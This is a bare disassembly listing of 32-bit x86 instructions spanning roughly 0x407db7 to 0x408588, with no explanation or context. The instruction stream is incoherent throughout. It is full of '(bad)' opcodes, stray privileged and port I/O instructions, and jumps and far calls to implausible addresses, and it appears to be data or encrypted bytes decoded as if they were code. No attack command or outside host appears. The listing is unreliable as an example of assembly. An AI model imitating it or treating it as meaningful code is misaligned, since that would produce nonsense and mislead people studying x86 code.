  407db7:	push   eax
  407db8:	adc    DWORD PTR [ebp+0x17],ebp
  407dbb:	inc    esp
  407dbc:	mov    al,ds:0x1157c0ad
  407dc1:	inc    esp
  407dc2:	xor    ah,dl
  407dc4:	jl     0x407d8a
  407dc6:	aas    
  407dc7:	inc    esp
  407dc8:	ins    BYTE PTR es:[edi],dx
  407dc9:	add    eax,0x572ca763
  407dce:	(bad)  
  407dcf:	daa    
  407dd0:	or     DWORD PTR [edi],esp
  407dd2:	cld    
  407dd3:	pop    esp
  407dd4:	shl    DWORD PTR [ebx],cl
  407dd6:	test   DWORD PTR [eax],ebp
  407dd8:	mov    al,0xb3
  407dda:	aas    
  407ddb:	cmp    BYTE PTR [ebp+0x63],0xbf
  407ddf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407de0:	sbb    ebp,DWORD PTR [ebx]
  407de2:	mov    ebp,0x1ea6769c
  407de7:	repnz push ecx
  407de9:	sub    BYTE PTR [ebx],al
  407deb:	dec    eax
  407dec:	(bad)  
  407ded:	jo     0x407d91
  407def:	inc    esp
  407df0:	fs dec ebp
  407df2:	push   0xffffffa9
  407df4:	rcr    DWORD PTR [ebp-0x23],0x34
  407df8:	or     eax,0xcb145021
  407dfd:	mov    al,0xea
  407dff:	add    BYTE PTR [ebp+0x427e6eb6],dl
  407e05:	out    0x6d,eax
  407e07:	mov    al,ds:0xdb6b921d
  407e0c:	lea    ecx,[edx+0x65e52874]
  407e12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e13:	lods   al,BYTE PTR ds:[esi]
  407e14:	hlt    
  407e15:	pop    es
  407e16:	push   esp
  407e17:	mov    edi,0x6bc8bd5d
  407e1c:	mov    DWORD PTR [esi+ecx*4+0x59],ebp
  407e20:	lds    edx,FWORD PTR [ebx]
  407e22:	adc    al,0x16
  407e24:	or     dh,BYTE PTR [edi+0x5a49062f]
  407e2a:	inc    eax
  407e2b:	and    BYTE PTR [ebp+ecx*2-0x6a7ab85c],bl
  407e32:	mov    cl,0xf1
  407e34:	inc    eax
  407e35:	or     ecx,DWORD PTR [edx]
  407e37:	xchg   edi,eax
  407e38:	int    0xd5
  407e3a:	fs aam 0xd3
  407e3d:	xchg   edi,eax
  407e3e:	cld    
  407e3f:	aas    
  407e40:	cmc    
  407e41:	add    DWORD PTR [ebx+0x36053f6f],esi
  407e47:	cmc    
  407e48:	cmp    dh,BYTE PTR [eax-0x2d229317]
  407e4e:	adc    eax,0xbe5768cd
  407e53:	add    ecx,DWORD PTR [ebp-0x533da410]
  407e59:	fcomp  DWORD PTR [ecx]
  407e5b:	call   0x4562694f
  407e60:	inc    esi
  407e61:	data16 je 0x407e43
  407e64:	push   ds
  407e65:	mov    eax,0xda085c65
  407e6a:	(bad)  
  407e6c:	xor    edi,DWORD PTR [ecx-0x32eca88a]
  407e72:	int    0x58
  407e74:	mov    esp,esp
  407e76:	push   0x0
  407e78:	jo     0x407e30
  407e7a:	jae    0x407eed
  407e7c:	cmp    eax,0x72a90094
  407e81:	or     al,BYTE PTR [edi+0x677d396]
  407e87:	sub    BYTE PTR [ebp-0x16],bl
  407e8a:	mov    cl,cl
  407e8c:	xor    DWORD PTR [esp+ebp*1+0x708556b8],eax
  407e93:	pop    esi
  407e94:	xor    ebx,DWORD PTR [eax-0x1ce65b9a]
  407e9a:	sub    al,0x7c
  407e9c:	fdiv   DWORD PTR [edi]
  407e9e:	(bad)  
  407ea0:	fcos   
  407ea2:	push   esi
  407ea3:	and    DWORD PTR [esi],eax
  407ea5:	push   ecx
  407ea6:	pop    esp
  407ea7:	push   esi
  407ea8:	or     eax,0x50bcfec6
  407ead:	jbe    0x407e66
  407eaf:	fcomp  QWORD PTR [ecx+eax*4-0x2c]
  407eb3:	add    al,0x53
  407eb5:	(bad)  [edi]
  407eb7:	cmc    
  407eb8:	dec    ecx
  407eb9:	inc    esi
  407eba:	cmp    bl,BYTE PTR [eax+edi*1]
  407ebd:	push   ecx
  407ebe:	addr16 cs mov bh,0x76
  407ec2:	jg     0x407eb1
  407ec4:	mov    cl,BYTE PTR [esp+ebx*4-0x5b62008a]
  407ecb:	add    DWORD PTR [edx*4+0x253e85ee],0xdbacfbda
  407ed6:	lods   eax,DWORD PTR ds:[esi]
  407ed7:	cmp    ebx,DWORD PTR ds:0x70cfddb3
  407edd:	imul   ebp,DWORD PTR [ecx],0x3d21c03f
  407ee3:	mov    ebx,0xa11ce67f
  407ee8:	mov    eax,0x720ea89
  407eed:	xchg   DWORD PTR [ecx-0x7bd6dffb],edx
  407ef3:	or     bh,al
  407ef5:	dec    edx
  407ef6:	int3   
  407ef7:	test   ah,dh
  407ef9:	and    DWORD PTR [ebp+0x77],esi
  407efc:	inc    esi
  407efd:	adc    BYTE PTR [edx+ebx*4+0x7f],cl
  407f01:	and    esp,eax
  407f03:	inc    eax
  407f04:	dec    esp
  407f05:	inc    edi
  407f06:	adc    bh,BYTE PTR [ecx-0x1335b43d]
  407f0c:	les    edi,FWORD PTR [esi]
  407f0e:	xchg   edx,eax
  407f0f:	lods   eax,DWORD PTR ds:[esi]
  407f10:	aam    0xf6
  407f12:	gs ds sti 
  407f15:	push   es
  407f16:	add    al,BYTE PTR [ecx+0x5899289a]
  407f1c:	aaa    
  407f1d:	mov    edx,ecx
  407f1f:	add    dh,al
  407f21:	or     BYTE PTR [ecx],0x4c
  407f24:	and    ch,BYTE PTR [edi+edx*8]
  407f27:	in     al,0xd
  407f29:	or     ah,BYTE PTR [ebx]
  407f2b:	cmp    al,0xe5
  407f2d:	mov    ch,0x7b
  407f2f:	mov    ?,WORD PTR [edi]
  407f31:	call   0x4736:0xde33d590
  407f38:	push   ds
  407f39:	lahf   
  407f3a:	aad    0x62
  407f3c:	pop    ebp
  407f3d:	xor    ch,BYTE PTR ds:0xab805d73
  407f43:	(bad)  
  407f44:	fmul   QWORD PTR [edi+0x41f6ce0f]
  407f4a:	cmp    al,0xf8
  407f4c:	popf   
  407f4d:	and    al,0xa7
  407f4f:	(bad)  
  407f50:	shl    bl,1
  407f52:	sub    DWORD PTR [ecx+0x2be7238f],0xffffffc1
  407f59:	xchg   esp,eax
  407f5a:	popa   
  407f5b:	push   ds
  407f5c:	pop    ebp
  407f5d:	in     eax,dx
  407f5e:	(bad)  
  407f5f:	xor    al,0xab
  407f61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f62:	pop    ebp
  407f63:	sub    eax,0xa8fd708b
  407f68:	dec    esi
  407f69:	mov    eax,esi
  407f6b:	out    dx,al
  407f6c:	nop
  407f6d:	sub    dl,BYTE PTR [edx]
  407f6f:	es and eax,0xd4e0bdf6
  407f75:	rcr    eax,0xd6
  407f78:	inc    edx
  407f79:	loop   0x407eff
  407f7b:	aaa    
  407f7c:	and    ch,BYTE PTR [edi+ebx*2-0x7cfed840]
  407f83:	ins    DWORD PTR es:[edi],dx
  407f84:	push   edi
  407f85:	xchg   ebx,eax
  407f86:	mov    al,ds:0x822d89df
  407f8b:	push   0xffffffc1
  407f8d:	dec    ebx
  407f8e:	dec    esp
  407f8f:	adc    BYTE PTR [edi-0x57a92776],0xf4
  407f96:	mov    BYTE PTR [ebx+0x2f],bh
  407f99:	inc    esp
  407f9a:	lods   al,BYTE PTR ds:[esi]
  407f9b:	(bad)  
  407f9d:	mov    al,ds:0x5165bea4
  407fa2:	xorps  xmm4,XMMWORD PTR fs:[eax-0x12917f9a]
  407faa:	fdivrp st(1),st
  407fac:	cdq    
  407fad:	add    DWORD PTR [esi+esi*8],ebx
  407fb0:	inc    edi
  407fb1:	adc    esp,DWORD PTR [edi]
  407fb3:	and    ah,bh
  407fb5:	mov    edx,0xdf977ac6
  407fba:	shr    BYTE PTR [ebp-0x4816b38e],cl
  407fc0:	mov    BYTE PTR [ebp-0x48],al
  407fc3:	das    
  407fc4:	sbb    DWORD PTR ss:[edx],ebp
  407fc7:	jns    0x40802d
  407fc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407fca:	lock mov dh,0xdd
  407fcd:	push   0xffffffd8
  407fcf:	in     eax,dx
  407fd0:	and    DWORD PTR [eax],esp
  407fd2:	push   esi
  407fd3:	push   es
  407fd4:	fdivr  st(6),st
  407fd6:	jg     0x408019
  407fd8:	xchg   edx,eax
  407fd9:	cmp    eax,0xd02858b3
  407fde:	sub    dl,BYTE PTR [eax+0x1bda37f0]
  407fe4:	dec    esi
  407fe5:	xchg   ebx,eax
  407fe6:	sub    bh,bl
  407fe8:	ret    0x9282
  407feb:	shl    BYTE PTR [esp+ebx*8+0x2856626],cl
  407ff2:	mov    eax,ds:0xd4a1e2ed
  407ff7:	push   es
  407ff8:	cld    
  407ff9:	int    0xa6
  407ffb:	push   edx
  407ffc:	test   eax,0x47e3cf90
  408001:	mov    ch,0xb9
  408003:	dec    ebp
  408004:	jno    0x408028
  408006:	adc    DWORD PTR [edi+0x35],0x6c161f43
  40800d:	xor    eax,0x8edaf2e0
  408012:	xlat   BYTE PTR ds:[ebx]
  408013:	lahf   
  408014:	retf   
  408015:	push   ds
  408016:	hlt    
  408017:	(bad)  
  408018:	sub    dl,BYTE PTR [eax]
  40801a:	cmc    
  40801b:	xchg   ebp,eax
  40801c:	xchg   edi,eax
  40801d:	aas    
  40801e:	or     bl,BYTE PTR [ebp+0x4cd2943c]
  408024:	jmp    0x9d9701cb
  408029:	std    
  40802a:	frstor [ecx]
  40802c:	inc    edx
  40802d:	sbb    eax,0xbe7be0e9
  408032:	sbb    eax,0x80e540a7
  408037:	jg     0x408095
  408039:	sahf   
  40803a:	sbb    cl,BYTE PTR [edx]
  40803c:	or     al,0x32
  40803e:	popf   
  40803f:	jecxz  0x407fdb
  408041:	(bad)  
  408043:	iret   
  408044:	push   ebx
  408045:	add    ah,BYTE PTR [ecx-0x6b]
  408048:	shl    BYTE PTR [ebx+0x15],cl
  40804b:	ins    BYTE PTR es:[edi],dx
  40804c:	inc    esp
  40804d:	int3   
  40804e:	mov    dl,0xe
  408050:	std    
  408051:	jbe    0x4080bd
  408053:	cli    
  408054:	std    
  408055:	cs and eax,0x24142bc8
  40805b:	shl    DWORD PTR [ecx+0x5e58e5d3],cl
  408061:	mov    al,BYTE PTR [ebx-0x100cd60a]
  408067:	jne    0x4080d5
  408069:	adc    DWORD PTR [ebx],edx
  40806b:	(bad)  
  40806c:	sbb    eax,0x7c3389c7
  408071:	add    cl,BYTE PTR [edi]
  408073:	sar    BYTE PTR [ebp-0xef6310a],0x25
  40807a:	mov    esp,0x9dee22f4
  40807f:	sub    DWORD PTR [edi],ecx
  408081:	outs   dx,BYTE PTR ds:[esi]
  408082:	xchg   DWORD PTR [edi],ecx
  408084:	push   cs
  408085:	dec    esi
  408086:	aaa    
  408087:	dec    esi
  408088:	mov    esp,0x6af8e5b4
  40808d:	mov    esi,0x18a53eec
  408092:	aam    0x25
  408094:	push   0x10
  408096:	push   ebp
  408097:	xor    BYTE PTR [ebx+0x6969b705],ch
  40809d:	popa   
  40809e:	push   es
  40809f:	xchg   ecx,eax
  4080a0:	add    bh,BYTE PTR [ecx-0xa78f64c]
  4080a6:	pop    esi
  4080a7:	scas   al,BYTE PTR es:[edi]
  4080a8:	mov    ebx,0x8e553a1e
  4080ad:	mov    cl,0xe
  4080af:	cmp    bh,bl
  4080b1:	lock daa 
  4080b3:	mov    bl,0x84
  4080b5:	sbb    ah,BYTE PTR [edx+ebp*8+0x26]
  4080b9:	aas    
  4080ba:	dec    esi
  4080bb:	call   0x6546:0xee2e0559
  4080c2:	or     esi,eax
  4080c4:	mov    DWORD PTR [ecx+ebx*1+0x9085bda],0x1687e96d
  4080cf:	dec    edi
  4080d0:	fcmovu st,st(4)
  4080d2:	or     eax,0xb72537d6
  4080d7:	pop    ds
  4080d8:	push   edi
  4080d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4080da:	cmp    al,0x9e
  4080dc:	xchg   ebx,eax
  4080dd:	out    0x1d,al
  4080df:	scas   eax,DWORD PTR es:[edi]
  4080e0:	push   ebp
  4080e1:	or     ah,0xc0
  4080e4:	pop    ds
  4080e5:	retf   
  4080e6:	mov    dl,0x43
  4080e8:	enter  0xf25c,0x18
  4080ec:	xor    BYTE PTR [eax-0x25],bl
  4080ef:	mov    WORD PTR [edi+eax*2+0x2326395e],ds
  4080f6:	leave  
  4080f7:	lds    ecx,FWORD PTR [eax-0x67f07cb4]
  4080fd:	add    esi,ebx
  4080ff:	mov    bh,0x3a
  408101:	cld    
  408102:	sub    BYTE PTR [eax+0x33],cl
  408105:	daa    
  408106:	cli    
  408107:	pop    esp
  408108:	push   cs
  408109:	clc    
  40810a:	loope  0x408109
  40810c:	mov    edx,0xbf774b1e
  408111:	mov    dh,0x16
  408113:	scas   al,BYTE PTR es:[edi]
  408114:	fisttp WORD PTR [ebp-0x59]
  408117:	mov    esi,DWORD PTR ds:0x3fb0a589
  40811d:	aad    0x25
  40811f:	add    esi,DWORD PTR [edx+ebx*4-0x2b0fe2ce]
  408126:	pushf  
  408127:	mov    ebp,0xdc599c06
  40812c:	sbb    DWORD PTR [eax+0x6e6c18fd],0x6a
  408133:	or     al,0x2b
  408135:	pop    ebp
  408136:	mov    ds:0xda058ab8,al
  40813b:	xor    edi,DWORD PTR [esp+ecx*1-0x5b57cb08]
  408142:	pop    esi
  408143:	add    ecx,DWORD PTR [esi]
  408145:	mov    cl,0x59
  408147:	lahf   
  408148:	sub    DWORD PTR [ebx-0x34],ebp
  40814b:	mov    ebp,0xf60ea1b9
  408150:	push   ebp
  408151:	sub    bl,BYTE PTR [edx]
  408153:	and    cl,BYTE PTR [edi]
  408155:	or     al,BYTE PTR [edx-0x3a]
  408158:	or     BYTE PTR [ebx+esi*1],dh
  40815b:	cmp    ch,BYTE PTR [ebx+0x1f]
  40815e:	adc    DWORD PTR [ebp-0x31],edi
  408161:	push   ebp
  408162:	jne    0x4081b5
  408164:	adc    esi,DWORD PTR [ebp-0x58]
  408167:	mov    WORD PTR [ebp-0x27305686],gs
  40816d:	clc    
  40816e:	xchg   edi,eax
  40816f:	add    eax,0xc8d57880
  408174:	lahf   
  408175:	cmp    ebx,edi
  408177:	mov    eax,0x22e858bc
  40817c:	stos   BYTE PTR es:[edi],al
  40817d:	add    BYTE PTR [ebx],al
  40817f:	pop    esi
  408180:	pop    eax
  408181:	ss hlt 
  408183:	mov    ch,0xf8
  408185:	push   es
  408186:	pop    edi
  408187:	cmp    BYTE PTR [eax+0x766b929f],cl
  40818d:	sub    al,0x6c
  40818f:	cld    
  408190:	add    DWORD PTR [eax],esi
  408192:	adc    ecx,DWORD PTR [ecx+0x5]
  408195:	adc    eax,0xe1fc6574
  40819a:	add    eax,0x809ab820
  40819f:	jne    0x40814c
  4081a1:	leave  
  4081a2:	mov    bl,BYTE PTR ds:0x8fdd709a
  4081a8:	mov    ecx,0x17bd36bc
  4081ad:	mov    eax,0x7b1c0a54
  4081b2:	outs   dx,DWORD PTR ds:[esi]
  4081b3:	retf   
  4081b4:	push   esi
  4081b5:	(bad)
  4081b8:	push   ds
  4081b9:	xor    BYTE PTR [ebp-0x233fca77],ch
  4081bf:	in     eax,dx
  4081c0:	jp     0x408200
  4081c2:	dec    esp
  4081c3:	fidiv  WORD PTR [esp+esi*2+0x1fcc21bb]
  4081ca:	shr    BYTE PTR ds:0x83497120,cl
  4081d0:	dec    esp
  4081d1:	xchg   ecx,eax
  4081d2:	jne    0x4081f7
  4081d4:	sbb    cl,BYTE PTR es:[esi]
  4081d7:	call   0x30988489
  4081dc:	fcmovnu st,st(7)
  4081de:	shl    BYTE PTR [edx-0x1a2a491d],cl
  4081e4:	inc    ebx
  4081e5:	ror    DWORD PTR [eax],cl
  4081e7:	dec    ecx
  4081e8:	dec    esp
  4081e9:	lahf   
  4081ea:	cmp    al,0xd1
  4081ec:	iret   
  4081ed:	lods   al,BYTE PTR ds:[esi]
  4081ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4081ef:	or     al,0xe3
  4081f1:	and    eax,0x9b8d00e3
  4081f6:	jg     0x408239
  4081f8:	add    DWORD PTR [edx-0x5a],edi
  4081fb:	xchg   ebp,eax
  4081fc:	sar    BYTE PTR [ebp-0x5],0x2d
  408200:	push   edx
  408201:	or     BYTE PTR [ecx],ch
  408203:	fimul  DWORD PTR [esi+0x50daf750]
  408209:	outs   dx,BYTE PTR ds:[esi]
  40820a:	cdq    
  40820b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40820c:	xchg   edi,eax
  40820d:	hlt    
  40820e:	pushf  
  40820f:	arpl   WORD PTR [esi+0x2b],si
  408212:	xor    bh,BYTE PTR [edx]
  408214:	mov    edx,0xbafafc0f
  408219:	inc    esi
  40821a:	loope  0x408265
  40821c:	pop    eax
  40821d:	dec    esp
  40821e:	mov    ?,WORD PTR [ebp-0x38]
  408221:	ins    DWORD PTR es:[edi],dx
  408222:	pop    ds
  408223:	popf   
  408224:	es inc esi
  408226:	jmp    0x4081db
  408228:	push   0xffffff9b
  40822a:	fisubr WORD PTR [eax]
  40822c:	mov    ds:0x73e9ef8d,al
  408231:	pop    esi
  408232:	xchg   edx,eax
  408233:	push   0xffffffc2
  408235:	imul   ebx,DWORD PTR [ebx],0x76e82062
  40823b:	sar    edi,cl
  40823d:	push   ds
  40823e:	jg     0x408252
  408240:	xor    ah,bl
  408242:	ja     0x408226
  408244:	xlat   BYTE PTR ds:[ebx]
  408245:	mov    BYTE PTR [esi-0x329d514c],ch
  40824b:	clc    
  40824c:	mov    dl,0x6
  40824e:	outs   dx,DWORD PTR ds:[esi]
  40824f:	loope  0x40829d
  408251:	jae    0x408228
  408253:	cld    
  408254:	mov    esi,DWORD PTR [eax]
  408256:	ret    
  408257:	std    
  408258:	scas   al,BYTE PTR es:[edi]
  408259:	outs   dx,DWORD PTR ds:[esi]
  40825a:	out    0x17,eax
  40825c:	or     BYTE PTR [edx+ebx*4-0x78],ch
  408260:	into   
  408261:	jecxz  0x4081ea
  408263:	add    ecx,DWORD PTR [eax+edx*2-0x6b301aeb]
  40826a:	out    dx,eax
  40826b:	add    ah,BYTE PTR [edi+0x7137f4cd]
  408271:	les    esp,FWORD PTR [ecx]
  408273:	icebp  
  408274:	not    esp
  408276:	and    DWORD PTR [ecx-0x2225104e],0x7bbe5217
  408280:	xor    eax,0x973345bd
  408286:	div    DWORD PTR [ebx]
  408288:	dec    esp
  408289:	jno    0x408224
  40828b:	neg    BYTE PTR [ebp+0x15ab448b]
  408291:	aaa    
  408292:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408293:	push   ss
  408294:	push   ds
  408295:	in     al,dx
  408296:	aaa    
  408297:	fsub   st(7),st
  408299:	pop    ecx
  40829a:	pusha  
  40829b:	xchg   ebp,eax
  40829c:	or     BYTE PTR [ecx-0x62],0x39
  4082a0:	dec    ebp
  4082a1:	aam    0xeb
  4082a3:	adc    eax,0x7af585c1
  4082a8:	aad    0xb2
  4082aa:	(bad)  
  4082ab:	std    
  4082ac:	mov    ebx,0x585b0412
  4082b1:	stos   BYTE PTR es:[edi],al
  4082b2:	mov    eax,0xf658a1ca
  4082b7:	sahf   
  4082b8:	dec    ecx
  4082b9:	jge    0x40829b
  4082bb:	iret   
  4082bc:	fidiv  WORD PTR [ecx+edx*1]
  4082bf:	and    esi,DWORD PTR [edx+0x2e]
  4082c2:	fist   WORD PTR [ebx]
  4082c4:	arpl   WORD PTR [esi+eax*2-0x2c],di
  4082c8:	ja     0x4082a2
  4082ca:	retf   
  4082cb:	cmp    cl,BYTE PTR [ebx+0x8]
  4082ce:	adc    DWORD PTR [esi+0x7b4ec103],ecx
  4082d4:	fnstsw WORD PTR [edx+eax*4-0x18617dd5]
  4082db:	fstp   TBYTE PTR [edx-0x7b]
  4082de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4082df:	hlt    
  4082e0:	mov    eax,0x611003e6
  4082e5:	test   al,0xc9
  4082e7:	aaa    
  4082e8:	scas   al,BYTE PTR es:[edi]
  4082e9:	mov    ah,0xad
  4082eb:	dec    eax
  4082ec:	cmp    ah,BYTE PTR [ecx]
  4082ee:	(bad)  [esi+0x69]
  4082f1:	loopne 0x40832f
  4082f3:	in     al,0x39
  4082f5:	push   ebx
  4082f6:	lods   eax,DWORD PTR ds:[esi]
  4082f7:	das    
  4082f8:	sahf   
  4082f9:	out    0xfd,eax
  4082fb:	mov    ecx,0x74b4c0d1
  408300:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408301:	fld    TBYTE PTR es:[ebp+0x535ad4c]
  408308:	inc    edx
  408309:	xchg   ebp,eax
  40830a:	pop    esp
  40830b:	cwde   
  40830c:	mov    bh,0x91
  40830e:	addr16 popa 
  408310:	(bad)  
  408311:	jecxz  0x408382
  408313:	pop    eax
  408314:	dec    esi
  408315:	jmp    0x4082e8
  408317:	(bad)  
  408318:	pop    esi
  408319:	imul   eax,edx,0x1df4b50
  40831f:	and    BYTE PTR [ecx+0x6f],0xb4
  408323:	fsub   st,st(2)
  408325:	test   BYTE PTR [ecx],al
  408327:	aam    0xcb
  408329:	lahf   
  40832a:	mov    ds:0xe55c29e3,eax
  40832f:	jnp    0x408387
  408331:	jae    0x408329
  408333:	jne    0x408364
  408335:	jb     0x4082ba
  408337:	arpl   di,bx
  408339:	xchg   edi,eax
  40833a:	inc    ebp
  40833b:	daa    
  40833c:	nop
  40833d:	push   0x5d
  40833f:	fild   QWORD PTR [esi]
  408341:	dec    edi
  408342:	and    dl,BYTE PTR [ebx-0xeafcc51]
  408348:	icebp  
  408349:	sbb    DWORD PTR [esi+0x4c15c3eb],ebx
  40834f:	adc    al,0x33
  408351:	or     al,0x4a
  408353:	pop    esi
  408354:	pop    ebp
  408355:	arpl   WORD PTR [esi-0x1b85095a],bx
  40835b:	pop    eax
  40835c:	popf   
  40835d:	pop    edi
  40835e:	and    eax,0xa630ce66
  408363:	inc    esp
  408364:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408365:	pushf  
  408366:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408367:	mov    BYTE PTR [esi+0x7857b7f9],dh
  40836d:	shl    DWORD PTR [ebp+0x53],cl
  408370:	jb     0x40832d
  408372:	xchg   esp,eax
  408373:	push   ss
  408374:	push   eax
  408375:	sub    bl,BYTE PTR [eax+0x44]
  408378:	pop    ebp
  408379:	loope  0x408318
  40837b:	add    BYTE PTR [edx-0x19f77dfd],ah
  408381:	pusha  
  408382:	sub    edx,ecx
  408384:	aas    
  408385:	add    eax,0xb2c4c1b7
  40838a:	jbe    0x4083d3
  40838c:	mov    DWORD PTR [esi-0x765fb514],0xe83b6f51
  408396:	cli    
  408397:	addr16 (bad) 
  408399:	repz cmp eax,0x6be20247
  40839f:	mov    eax,ds:0xedf3093c
  4083a4:	or     BYTE PTR [edx+ebx*1],al
  4083a7:	xor    al,BYTE PTR [esi-0x3b]
  4083aa:	xor    bl,BYTE PTR [ebx+0x5eb855c1]
  4083b0:	test   BYTE PTR [ebp-0x43],ah
  4083b3:	pop    es
  4083b4:	jnp    0x408407
  4083b6:	cmp    ebp,esp
  4083b8:	mov    ebx,0xc25816a7
  4083bd:	sbb    dl,BYTE PTR [ebp-0x5631a047]
  4083c3:	xor    eax,0x366330a0
  4083c8:	mov    eax,ds:0xed30c7d9
  4083cd:	cmp    BYTE PTR [ecx+0x57],dh
  4083d0:	push   ds
  4083d1:	fmulp  st(1),st
  4083d3:	mov    ds:0x102d0a85,al
  4083d8:	js     0x40835c
  4083da:	addr16 or al,0x3c
  4083dd:	and    bh,BYTE PTR [eax-0x38d9518b]
  4083e3:	retf   
  4083e4:	loopne 0x40839a
  4083e6:	and    DWORD PTR [ecx-0xc],eax
  4083e9:	sbb    eax,0xdc288001
  4083ee:	add    BYTE PTR [edi+0x7a7e9c00],dh
  4083f4:	je     0x4083e6
  4083f6:	(bad)  
  4083f7:	scas   al,BYTE PTR es:[edi]
  4083f8:	push   es
  4083f9:	push   ds
  4083fa:	ret    0x35e6
  4083fd:	sub    bl,BYTE PTR [esi]
  4083ff:	mov    cl,bh
  408401:	lahf   
  408402:	xor    BYTE PTR [ebx],dh
  408404:	loop   0x408436
  408406:	outs   dx,DWORD PTR ds:[esi]
  408407:	mov    ebp,0x267714f5
  40840c:	jnp    0x408470
  40840e:	cmp    al,0x34
  408410:	shl    BYTE PTR [edi],1
  408412:	inc    edx
  408413:	bound  ebx,QWORD PTR [ecx-0x4716b2c1]
  408419:	xchg   DWORD PTR [ecx+0x742808f6],edx
  40841f:	test   BYTE PTR [eax+eax*8],bl
  408422:	mov    edx,0xb693b658
  408427:	in     al,dx
  408428:	ss mov ebp,0xbb1f2584
  40842e:	jnp    0x40847e
  408430:	push   edx
  408431:	mov    cl,bh
  408433:	or     bl,ah
  408435:	add    ch,dh
  408437:	outs   dx,DWORD PTR ds:[si]
  408439:	lods   eax,DWORD PTR ds:[esi]
  40843a:	push   edx
  40843b:	mov    al,ds:0xb4cdd51a
  408440:	outs   dx,BYTE PTR ds:[esi]
  408441:	mov    bl,0x30
  408443:	ret    0x5318
  408446:	mov    eax,ds:0x4781f850
  40844b:	outs   dx,BYTE PTR ds:[esi]
  40844c:	dec    ecx
  40844d:	jecxz  0x408415
  40844f:	outs   dx,BYTE PTR ds:[esi]
  408450:	push   es
  408451:	xchg   BYTE PTR [ecx],al
  408453:	dec    eax
  408454:	dec    ecx
  408455:	in     al,dx
  408456:	add    al,0x4a
  408458:	dec    DWORD PTR [eax]
  40845a:	nop
  40845b:	push   ss
  40845c:	xchg   esi,eax
  40845d:	mov    al,ds:0xdfdac6d9
  408462:	das    
  408463:	dec    ebx
  408464:	push   ds
  408465:	sbb    BYTE PTR [eax+edi*8-0x22],dl
  408469:	inc    edx
  40846a:	push   ss
  40846b:	aaa    
  40846c:	add    al,0xd6
  40846e:	cmp    esi,DWORD PTR [ebx+0x4c]
  408471:	std    
  408472:	jmp    0xd759ed18
  408477:	jo     0x408418
  408479:	sbb    BYTE PTR [esi+0x7c],0xc8
  40847d:	fisttp WORD PTR [eax+0x7699364]
  408483:	je     0x408417
  408485:	sub    ecx,0xd8162e47
  40848b:	fstp   DWORD PTR [esi-0x3fe48107]
  408491:	fistp  DWORD PTR [edi-0x66]
  408494:	mov    esp,0x13a28d57
  408499:	push   0xbcbf00e4
  40849e:	or     al,0xf2
  4084a0:	xchg   esi,eax
  4084a1:	ret    0x7cf0
  4084a4:	jg     0x4084d8
  4084a6:	sbb    cl,BYTE PTR [edx+0x33]
  4084a9:	ins    DWORD PTR es:[edi],dx
  4084aa:	call   0x8bd6:0x3afa4220
  4084b1:	xchg   BYTE PTR [edx],dh
  4084b3:	cmp    ebp,DWORD PTR [eax+0x51e98968]
  4084b9:	cs and al,0x6d
  4084bc:	loop   0x408516
  4084be:	pusha  
  4084bf:	push   0xdbdec965
  4084c4:	xor    BYTE PTR [eax],bl
  4084c6:	lods   eax,DWORD PTR ds:[esi]
  4084c7:	push   ss
  4084c8:	add    eax,0x52999b8a
  4084cd:	mov    ah,0x5a
  4084cf:	adc    esi,ebp
  4084d1:	xchg   esp,eax
  4084d2:	mov    esi,0xdae792f1
  4084d7:	xor    dl,BYTE PTR [ecx+0x4c]
  4084da:	sbb    eax,0xa90d5614
  4084df:	jl     0x40848b
  4084e1:	loope  0x4084bb
  4084e3:	call   0x9fe1fa14
  4084e8:	or     cl,BYTE PTR [eax-0x38c304d5]
  4084ee:	dec    edx
  4084ef:	in     eax,0x21
  4084f1:	sbb    DWORD PTR [esi-0x45],esp
  4084f4:	aas    
  4084f5:	mov    al,0xa1
  4084f7:	jp     0x40847e
  4084f9:	xor    DWORD PTR [ecx+edi*2-0x62eb5f31],esi
  408500:	in     al,0x66
  408502:	loopne 0x40848b
  408504:	jb     0x40851a
  408506:	dec    ecx
  408507:	scas   al,BYTE PTR es:[edi]
  408508:	fistp  WORD PTR [esi-0x22]
  40850b:	nop
  40850c:	int    0xc9
  40850e:	adc    bl,BYTE PTR [ebp+0x50]
  408511:	pushf  
  408512:	clc    
  408513:	inc    esi
  408514:	mov    eax,ds:0xeefbf906
  408519:	and    DWORD PTR ds:0xc9a6916,0x4c99de3b
  408523:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408524:	mov    ecx,0x5ca5d7
  408529:	mov    al,0x2
  40852b:	jge    0x4084da
  40852d:	popf   
  40852e:	xor    eax,DWORD PTR [ecx+ebp*4+0x3938c631]
  408535:	enter  0xaddc,0x2d
  408539:	adc    BYTE PTR [edi-0x7],ah
  40853c:	sbb    esi,DWORD PTR [ebp-0x74]
  40853f:	lods   al,BYTE PTR ds:[esi]
  408540:	pop    edx
  408541:	lds    eax,FWORD PTR [ecx-0x4519fd05]
  408547:	cmp    DWORD PTR ds:0x8dccf318,ebp
  40854d:	jbe    0x4085ab
  40854f:	xchg   ebp,eax
  408550:	and    ch,al
  408552:	daa    
  408553:	ins    BYTE PTR es:[edi],dx
  408554:	mov    ebp,0xb4d0c6cb
  408559:	aad    0x9a
  40855b:	sbb    ah,BYTE PTR [eax]
  40855d:	inc    esi
  40855e:	jnp    0x40851d
  408560:	cmp    al,0x2d
  408562:	imul   esp,DWORD PTR [edx-0x1c],0x8ff566b5
  408569:	hlt    
  40856a:	mov    eax,0xf40998bb
  40856f:	push   esp
  408570:	shl    BYTE PTR [edi+0xed1ba78],1
  408576:	std    
  408577:	sti    
  408578:	fucomp st(2)
  40857a:	out    0xe2,eax
  40857c:	inc    edx
  40857d:	sub    eax,0x789efd53
  408582:	out    dx,ax
  408584:	fldenv [edi]
  408586:	aas    
  408587:	aas    
  408588:	jp     0x4085ab
